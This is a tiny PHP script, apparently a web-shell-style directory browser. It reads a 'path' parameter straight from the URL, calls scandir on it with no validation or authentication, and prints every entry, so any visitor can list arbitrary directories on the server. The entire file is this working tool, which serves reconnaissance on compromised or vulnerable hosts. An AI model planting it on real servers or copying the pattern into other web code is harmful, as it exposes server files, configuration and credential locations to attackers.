<?php
if(isset($_GET['path'])){$dir=scandir($_GET['path']);for($i=0;$i<count($dir);$i++){echo $dir[$i],'</br>';}}
?>